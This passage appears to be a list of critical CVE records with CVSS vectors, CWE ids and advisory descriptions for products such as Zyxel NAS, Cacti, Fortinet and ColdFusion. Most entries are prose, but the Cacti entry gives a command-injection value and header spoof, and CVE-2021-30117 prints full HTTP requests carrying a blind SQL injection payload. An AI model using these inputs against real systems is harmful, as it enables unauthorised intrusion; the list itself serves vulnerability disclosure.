| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2024-06-04T01:29:41.852Z |

** UNSUPPORTED WHEN ASSIGNED **
The command injection vulnerability in the “setCookie” parameter in Zyxel NAS326 firmware versions before V5.21(AAZF.17)C0 and NAS542 firmware versions before V5.21(ABAG.14)C0 could allow an unauthenticated attacker to execute some operating system (OS) commands by sending a crafted HTTP POST request.

### CVE-2024-29972

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2024-06-04T01:24:58.172Z |

** UNSUPPORTED WHEN ASSIGNED **
The command injection vulnerability in the CGI program "remote_help-cgi" in Zyxel NAS326 firmware versions before V5.21(AAZF.17)C0 and NAS542 firmware versions before V5.21(ABAG.14)C0 could allow an unauthenticated attacker to execute some operating system (OS) commands by sending a crafted HTTP POST request.

### CVE-2024-23692

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-1336` |
| Published | 2024-05-31T09:36:28.763Z |

Rejetto HTTP File Server, up to and including version 2.3m, is vulnerable to a template injection vulnerability. This vulnerability allows a remote, unauthenticated attacker to execute arbitrary commands on the affected system by sending a specially crafted HTTP request. As of the CVE assignment date, Rejetto HFS 2.3m is no longer supported.

### CVE-2023-42115

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-787` |
| Published | 2024-05-03T02:13:23.745Z |

Exim AUTH Out-Of-Bounds Write Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of Exim. Authentication is not required to exploit this vulnerability. 

The specific flaw exists within the smtp service, which listens on TCP port 25 by default. The issue results from the lack of proper validation of user-supplied data, which can result in a write past the end of a buffer. An attacker can leverage this vulnerability to execute code in the context of the service account.
. Was ZDI-CAN-17434.

### CVE-2023-40504

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2024-05-03T02:11:32.315Z |

LG Simple Editor readVideoInfo Command Injection Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of LG Simple Editor. Authentication is not required to exploit this vulnerability.

The specific flaw exists within the readVideoInfo method. The issue results from the lack of proper validation of a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code in the context of SYSTEM.
. Was ZDI-CAN-19953.

### CVE-2023-40498

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-22` |
| Published | 2024-05-03T02:11:27.809Z |

LG Simple Editor cp Command Directory Traversal Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of LG Simple Editor. Authentication is not required to exploit this vulnerability.

The specific flaw exists within the cp command implemented in the makeDetailContent method. The issue results from the lack of proper validation of a user-supplied path prior to using it in file operations. An attacker can leverage this vulnerability to execute code in the context of SYSTEM.
. Was ZDI-CAN-19925.

### CVE-2023-39476

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-502` |
| Published | 2024-05-03T02:10:42.122Z |

Inductive Automation Ignition JavaSerializationCodec Deserialization of Untrusted Data Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of Inductive Automation Ignition. Authentication is not required to exploit this vulnerability.

The specific flaw exists within the JavaSerializationCodec class. The issue results from the lack of proper validation of user-supplied data, which can result in deserialization of untrusted data. An attacker can leverage this vulnerability to execute code in the context of SYSTEM. Was ZDI-CAN-20291.

### CVE-2024-4040

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-1336` |
| Published | 2024-04-22T19:21:46.408Z |

A server side template injection vulnerability in CrushFTP in all versions before 10.7.1 and 11.1.0 on all platforms allows unauthenticated remote attackers to read files from the filesystem outside of the VFS Sandbox, bypass authentication to gain administrative access, and perform remote code execution on the server.

### CVE-2024-0799

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-287` |
| Published | 2024-03-13T18:57:51.441Z |

An authentication bypass vulnerability exists in Arcserve Unified Data Protection 9.2 and 8.1 in the edge-app-base-webui.jar!com.ca.arcserve.edge.app.base.ui.server.EdgeLoginServiceImpl.doLogin() function within wizardLogin.

### CVE-2024-25153

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-472` |
| Published | 2024-03-13T14:10:36.029Z |

A directory traversal within the ‘ftpservlet’ of the FileCatalyst Workflow Web Portal allows files to be uploaded outside of the intended ‘uploadtemp’ directory with a specially crafted POST request. In situations where a file is successfully uploaded to web portal’s DocumentRoot, specially crafted JSP files could be used to execute code, including web shells.

### CVE-2024-27198

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-288` |
| Published | 2024-03-04T17:21:39.422Z |

In JetBrains TeamCity before 2023.11.4 authentication bypass allowing to perform admin actions was possible

### CVE-2024-23113

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:H/RL:U/RC:C` |
| Weaknesses | `CWE-134` |
| Published | 2024-02-15T13:59:25.313Z |

A use of externally-controlled format string in Fortinet FortiOS versions 7.4.0 through 7.4.2, 7.2.0 through 7.2.6, 7.0.0 through 7.0.13, FortiProxy versions 7.4.0 through 7.4.2, 7.2.0 through 7.2.8, 7.0.0 through 7.0.14, FortiPAM versions 1.2.0, 1.1.0 through 1.1.2, 1.0.0 through 1.0.3, FortiSwitchManager versions 7.2.0 through 7.2.3, 7.0.0 through 7.0.3 allows attacker to execute unauthorized code or commands via specially crafted packets.

### CVE-2024-0204

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-425` |
| Published | 2024-01-22T18:05:13.194Z |

Authentication bypass in Fortra's GoAnywhere MFT prior to 7.4.1 allows an unauthorized user to create an admin user via the administration portal.

### CVE-2023-4474

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2023-11-30T01:45:29.920Z |

The improper neutralization of special elements in the WSGI server of the Zyxel NAS326 firmware version V5.21(AAZF.14)C0 and NAS542 firmware version V5.21(ABAG.11)C0 could allow an unauthenticated attacker to execute some operating system (OS) commands by sending a crafted URL to a vulnerable device.

### CVE-2023-4473

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2023-11-30T01:40:09.117Z |

A command injection vulnerability in the web server of the Zyxel NAS326 firmware version V5.21(AAZF.14)C0 and NAS542 firmware version V5.21(ABAG.11)C0 could allow an unauthenticated attacker to execute some operating system (OS) commands by sending a crafted URL to a vulnerable device.

### CVE-2023-49105

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AC:L/AV:N/A:H/C:H/I:H/PR:N/S:U/UI:N` |
| Weaknesses | `N/A` |
| Published | 2023-11-21T00:00:00.000Z |

An issue was discovered in ownCloud owncloud/core before 10.13.1. An attacker can access, modify, or delete any file without authentication if the username of a victim is known, and the victim has no signing-key configured. This occurs because pre-signed URLs can be accepted even when no signing-key is configured for the owner of the files. The earliest affected version is 10.6.0.

### CVE-2023-46747

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-288` |
| Published | 2023-10-26T20:04:53.929Z |

Undisclosed requests may bypass configuration utility authentication, allowing an attacker with network access to the BIG-IP system through the management port and/or self IP addresses to execute arbitrary system commands.  Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated

### CVE-2023-42793

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-288` |
| Published | 2023-09-19T16:57:29.245Z |

In JetBrains TeamCity before 2023.05.4 authentication bypass leading to RCE on TeamCity Server was possible

### CVE-2023-39361

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-89` |
| Published | 2023-09-05T20:58:00.188Z |

Cacti is an open source operational monitoring and fault management framework. Affected versions are subject to a SQL injection discovered in graph_view.php. Since guest users can access graph_view.php without authentication by default, if guest users are being utilized in an enabled state, there could be the potential for significant damage. Attackers may exploit this vulnerability, and there may be possibilities for actions such as the usurpation of administrative privileges or remote code execution. This issue has been addressed in version 1.2.25. Users are advised to upgrade. There are no known workarounds for this vulnerability.

### CVE-2023-3519

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-94` |
| Published | 2023-07-19T17:51:39.739Z |

Unauthenticated remote code execution

### CVE-2023-29300

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-502` |
| Published | 2023-07-12T15:46:08.686Z |

Adobe ColdFusion versions 2018u16 (and earlier), 2021u6 (and earlier) and 2023.0.0.330468 (and earlier) are affected by a Deserialization of Untrusted Data vulnerability that could result in Arbitrary code execution. Exploitation of this issue does not require user interaction.

### CVE-2023-32243

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-287` |
| Published | 2023-05-12T07:23:22.657Z |

Improper Authentication vulnerability in WPDeveloper Essential Addons for Elementor allows Privilege Escalation. This issue affects Essential Addons for Elementor: from 5.4.0 through 5.7.1.

### CVE-2023-25826

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2023-05-03T18:33:59.306Z |

Due to insufficient validation of parameters passed to the legacy HTTP query API, it is possible to inject crafted OS commands into multiple parameters and execute malicious code on the OpenTSDB host system. This exploit exists due to an incomplete fix that was made when this vulnerability was previously disclosed as CVE-2020-35476. Regex validation that was implemented to restrict allowed input to the query API does not work as intended, allowing crafted commands to bypass validation.

### CVE-2023-28771

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2023-04-25T00:00:00.000Z |

Improper error message handling in Zyxel ZyWALL/USG series firmware versions 4.60 through 4.73, VPN series firmware versions 4.60 through 5.35, USG FLEX series firmware versions 4.60 through 5.35, and ATP series firmware versions 4.60 through 5.35, which could allow an unauthenticated attacker to execute some OS commands remotely by sending crafted packets to an affected device.

### CVE-2023-27350

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-284` |
| Published | 2023-04-20T00:00:00.000Z |

This vulnerability allows remote attackers to bypass authentication on affected installations of PaperCut NG 22.0.5 (Build 63914). Authentication is not required to exploit this vulnerability. The specific flaw exists within the SetupCompleted class. The issue results from improper access control. An attacker can leverage this vulnerability to bypass authentication and execute arbitrary code in the context of SYSTEM. Was ZDI-CAN-18987.

### CVE-2023-26359

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-502` |
| Published | 2023-03-23T00:00:00.000Z |

Adobe ColdFusion versions 2018 Update 15 (and earlier) and 2021 Update 5 (and earlier) are affected by a Deserialization of Untrusted Data vulnerability that could result in arbitrary code execution in the context of the current user. Exploitation of this issue does not require user interaction.

### CVE-2022-47986

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-502` |
| Published | 2023-02-17T15:46:04.120Z |

IBM Aspera Faspex 4.4.2 Patch Level 1 and earlier could allow a remote attacker to execute arbitrary code on the system, caused by a YAML deserialization flaw. By sending a specially crafted obsolete API call, an attacker could exploit this vulnerability to execute arbitrary code on the system. The obsolete API call was removed in Faspex 4.4.2 PL2. IBM X-Force ID: 243512.

### CVE-2022-39952

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:H/RL:U/RC:C` |
| Weaknesses | `CWE-73` |
| Published | 2023-02-16T18:06:55.108Z |

A external control of file name or path in Fortinet FortiNAC versions 9.4.0, 9.2.0 through 9.2.5, 9.1.0 through 9.1.7, 8.8.0 through 8.8.11, 8.7.0 through 8.7.6, 8.6.0 through 8.6.5, 8.5.0 through 8.5.4, 8.3.7 may allow an unauthenticated attacker to execute unauthorized code or commands via specifically crafted HTTP request.

### CVE-2022-3184

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-22` |
| Published | 2022-12-21T22:26:26.255Z |

Dataprobe iBoot-PDU FW versions prior to 1.42.06162022 contain a vulnerability where the device’s existing firmware allows unauthenticated users to access an old PHP page vulnerable to directory traversal, which may allow a user to write a file to the webroot directory.

 





### CVE-2022-46169

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-74` |
| Published | 2022-12-05T20:48:07.852Z |

Cacti is an open source platform which provides a robust and extensible operational monitoring and fault management framework for users. In affected versions a command injection vulnerability allows an unauthenticated user to execute arbitrary code on a server running Cacti, if a specific data source was selected for any monitored device. The vulnerability resides in the `remote_agent.php` file. This file can be accessed without authentication. This function retrieves the IP address of the client via `get_client_addr` and resolves this IP address to the corresponding hostname via `gethostbyaddr`. After this, it is verified that an entry within the `poller` table exists, where the hostname corresponds to the resolved hostname. If such an entry was found, the function returns `true` and the client is authorized. This authorization can be bypassed due to the implementation of the `get_client_addr` function. The function is defined in the file `lib/functions.php` and checks serval `$_SERVER` variables to determine the IP address of the client. The variables beginning with `HTTP_` can be arbitrarily set by an attacker. Since there is a default entry in the `poller` table with the hostname of the server running Cacti, an attacker can bypass the authentication e.g. by providing the header `Forwarded-For: <TARGETIP>`. This way the function `get_client_addr` returns the IP address of the server running Cacti. The following call to `gethostbyaddr` will resolve this IP address to the hostname of the server, which will pass the `poller` hostname check because of the default entry. After the authorization of the `remote_agent.php` file is bypassed, an attacker can trigger different actions. One of these actions is called `polldata`. The called function `poll_for_data` retrieves a few request parameters and loads the corresponding `poller_item` entries from the database. If the `action` of a `poller_item` equals `POLLER_ACTION_SCRIPT_PHP`, the function `proc_open` is used to execute a PHP script. The attacker-controlled parameter `$poller_id` is retrieved via the function `get_nfilter_request_var`, which allows arbitrary strings. This variable is later inserted into the string passed to `proc_open`, which leads to a command injection vulnerability. By e.g. providing the `poller_id=;id` the `id` command is executed. In order to reach the vulnerable call, the attacker must provide a `host_id` and `local_data_id`, where the `action` of the corresponding `poller_item` is set to `POLLER_ACTION_SCRIPT_PHP`. Both of these ids (`host_id` and `local_data_id`) can easily be bruteforced. The only requirement is that a `poller_item` with an `POLLER_ACTION_SCRIPT_PHP` action exists. This is very likely on a productive instance because this action is added by some predefined templates like `Device - Uptime` or `Device - Polling Time`.

This command injection vulnerability allows an unauthenticated user to execute arbitrary commands if a `poller_item` with the `action` type `POLLER_ACTION_SCRIPT_PHP` (`2`) is configured. The authorization bypass should be prevented by not allowing an attacker to make `get_client_addr` (file `lib/functions.php`) return an arbitrary IP address. This could be done by not honoring the `HTTP_...` `$_SERVER` variables. If these should be kept for compatibility reasons it should at least be prevented to fake the IP address of the server running Cacti. This vulnerability has been addressed in both the 1.2.x and 1.3.x release branches with `1.2.23` being the first release containing the patch.

### CVE-2022-21587

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2022-10-18T00:00:00.000Z |

Vulnerability in the Oracle Web Applications Desktop Integrator product of Oracle E-Business Suite (component: Upload). Supported versions that are affected are 12.2.3-12.2.11. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Web Applications Desktop Integrator. Successful attacks of this vulnerability can result in takeover of Oracle Web Applications Desktop Integrator. CVSS 3.1 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).

### CVE-2022-40684

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F/RL:U/RC:C` |
| Weaknesses | `N/A` |
| Published | 2022-10-18T00:00:00.000Z |

An authentication bypass using an alternate path or channel [CWE-288] in Fortinet FortiOS version 7.2.0 through 7.2.1 and 7.0.0 through 7.0.6, FortiProxy version 7.2.0 and version 7.0.0 through 7.0.6 and FortiSwitchManager version 7.2.0 and 7.0.0 allows an unauthenticated atttacker to perform operations on the administrative interface via specially crafted HTTP or HTTPS requests.

### CVE-2022-35690

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-121` |
| Published | 2022-10-14T19:42:55.991Z |

Adobe ColdFusion versions Update 14 (and earlier) and Update 4 (and earlier) are affected by a Stack-based Buffer Overflow vulnerability that could result in arbitrary code execution in the context of the current user. Exploitation of this issue does not require user interaction, the vulnerability is triggered when a crafted network packet is sent to the server.

### CVE-2022-31061

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-89` |
| Published | 2022-06-28T17:55:11.000Z |

GLPI is a Free Asset and IT Management Software package, Data center management, ITIL Service Desk, licenses tracking and software auditing. In affected versions there is a SQL injection vulnerability which is possible on login page. No user credentials are required to exploit this vulnerability. Users are advised to upgrade as soon as possible. There are no known workarounds for this issue.

### CVE-2022-30525

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2022-05-12T13:05:11.000Z |

A OS command injection vulnerability in the CGI program of Zyxel USG FLEX 100(W) firmware versions 5.00 through 5.21 Patch 1, USG FLEX 200 firmware versions 5.00 through 5.21 Patch 1, USG FLEX 500 firmware versions 5.00 through 5.21 Patch 1, USG FLEX 700 firmware versions 5.00 through 5.21 Patch 1, USG FLEX 50(W) firmware versions 5.10 through 5.21 Patch 1, USG20(W)-VPN firmware versions 5.10 through 5.21 Patch 1, ATP series firmware versions 5.10 through 5.21 Patch 1, VPN series firmware versions 4.60 through 5.21 Patch 1, which could allow an attacker to modify specific files and then execute some OS commands on a vulnerable device.

### CVE-2022-1388

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-306` |
| Published | 2022-05-05T16:18:04.472Z |

On F5 BIG-IP 16.1.x versions prior to 16.1.2.2, 15.1.x versions prior to 15.1.5.1, 14.1.x versions prior to 14.1.4.6, 13.1.x versions prior to 13.1.5, and all 12.1.x and 11.6.x versions, undisclosed requests may bypass iControl REST authentication. Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated

### CVE-2022-0342

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-287` |
| Published | 2022-03-28T12:05:11.000Z |

An authentication bypass vulnerability in the CGI program of Zyxel USG/ZyWALL series firmware versions 4.20 through 4.70, USG FLEX series firmware versions 4.50 through 5.20, ATP series firmware versions 4.32 through 5.20, VPN series firmware versions 4.30 through 5.20, and NSG series firmware versions V1.20 through V1.33 Patch 4, which could allow an attacker to bypass the web authentication and obtain administrative access of the device.

### CVE-2022-1040

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2022-03-25T12:10:10.000Z |

An authentication bypass vulnerability in the User Portal and Webadmin allows a remote attacker to execute code in Sophos Firewall version v18.5 MR3 and older.

### CVE-2021-4039

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2022-03-01T06:40:09.000Z |

A command injection vulnerability in the web interface of the Zyxel NWA-1100-NH firmware could allow an attacker to execute arbitrary OS commands on the device.

### CVE-2021-35587

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2022-01-19T11:21:42.000Z |

Vulnerability in the Oracle Access Manager product of Oracle Fusion Middleware (component: OpenSSO Agent). Supported versions that are affected are 11.1.2.3.0, 12.2.1.3.0 and 12.2.1.4.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Access Manager. Successful attacks of this vulnerability can result in takeover of Oracle Access Manager. CVSS 3.1 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).

### CVE-2021-39226

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-287` |
| Published | 2021-10-05T17:30:11.000Z |

Grafana is an open source data visualization platform. In affected versions unauthenticated and authenticated users are able to view the snapshot with the lowest database key by accessing the literal paths: /dashboard/snapshot/:key, or /api/snapshots/:key. If the snapshot "public_mode" configuration setting is set to true (vs default of false), unauthenticated users are able to delete the snapshot with the lowest database key by accessing the literal path: /api/snapshots-delete/:deleteKey. Regardless of the snapshot "public_mode" setting, authenticated users are able to delete the snapshot with the lowest database key by accessing the literal paths: /api/snapshots/:key, or /api/snapshots-delete/:deleteKey. The combination of deletion and viewing enables a complete walk through all snapshot data while resulting in complete snapshot data loss. This issue has been resolved in versions 8.1.6 and 7.5.11. If for some reason you cannot upgrade you can use a reverse proxy or similar to block access to the literal paths: /api/snapshots/:key, /api/snapshots-delete/:deleteKey, /dashboard/snapshot/:key, and /api/snapshots/:key. They have no normal function and can be disabled without side effects.

### CVE-2021-38647

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C` |
| Weaknesses | `N/A` |
| Published | 2021-09-15T11:24:07.000Z |

Open Management Infrastructure Remote Code Execution Vulnerability

### CVE-2021-33543

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-306` |
| Published | 2021-09-13T17:55:32.000Z |

Multiple camera devices by UDP Technology, Geutebrück and other vendors allow unauthenticated remote access to sensitive files due to default user authentication settings. This can lead to manipulation of the device and denial of service.

### CVE-2021-21805

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2021-08-05T20:03:59.000Z |

An OS Command Injection vulnerability exists in the ping.php script functionality of Advantech R-SeeNet v 2.4.12 (20.10.2020). A specially crafted HTTP request can lead to arbitrary OS command execution. An attacker can send a crafted HTTP request to trigger this vulnerability.

### CVE-2021-30117

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2021-07-09T13:18:21.000Z |

The API call /InstallTab/exportFldr.asp is vulnerable to a semi-authenticated boolean-based blind SQL injection in the parameter fldrId. Detailed description --- Given the following request: ``` GET /InstallTab/exportFldr.asp?fldrId=1’ HTTP/1.1 Host: 192.168.1.194 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 Cookie: ASPSESSIONIDCQACCQCA=MHBOFJHBCIPCJBFKEPEHEDMA; sessionId=30548861; agentguid=840997037507813; vsaUser=scopeId=3&roleId=2; webWindowId=59091519; ``` Where the sessionId cookie value has been obtained via CVE-2021-30116. The result should be a failure. Response: ``` HTTP/1.1 500 Internal Server Error Cache-Control: private Content-Type: text/html; Charset=Utf-8 Date: Thu, 01 Apr 2021 19:12:11 GMT Strict-Transport-Security: max-age=63072000; includeSubDomains Connection: close Content-Length: 881 <!DOCTYPE html> <HTML> <HEAD> <title>Whoops.</title> <meta http-equiv="X-UA-Compatible" content="IE=Edge" /> <link id="favIcon" rel="shortcut icon" href="/themes/default/images/favicon.ico?307447361"></link> ----SNIP---- ``` However when fldrId is set to ‘(SELECT (CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END))’ the request is allowed. Request: ``` GET /InstallTab/exportFldr.asp?fldrId=%28SELECT%20%28CASE%20WHEN%20%281%3D1%29%20THEN%201%20ELSE%20%28SELECT%201%20UNION%20SELECT%202%29%20END%29%29 HTTP/1.1 Host: 192.168.1.194 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 Cookie: ASPSESSIONIDCQACCQCA=MHBOFJHBCIPCJBFKEPEHEDMA; sessionId=30548861; agentguid=840997037507813; vsaUser=scopeId=3&roleId=2; webWindowId=59091519; ``` Response: ``` HTTP/1.1 200 OK Cache-Control: private Content-Type: text/html; Charset=Utf-8 Date: Thu, 01 Apr 2021 17:33:53 GMT Strict-Transport-Security: max-age=63072000; includeSubDomains Connection: close Content-Length: 7960 <html> <head> <title>Export Folder</title> <style> ------ SNIP ----- ```

### CVE-2021-31474

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-502` |
| Published | 2021-05-21T14:40:15.000Z |

This vulnerability allows remote attackers to execute arbitrary code on affected installations of SolarWinds Network Performance Monitor 2020.2.1. Authentication is not required to exploit this vulnerability. The specific flaw exists within the SolarWinds.Serialization library. The issue results from the lack of proper validation of user-supplied data, which can result in deserialization of untrusted data. An attacker can leverage this vulnerability to execute code in the context of SYSTEM. Was ZDI-CAN-12213.

### CVE-2021-31166

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C` |
| Weaknesses | `N/A` |
| Published | 2021-05-11T19:11:19.000Z |

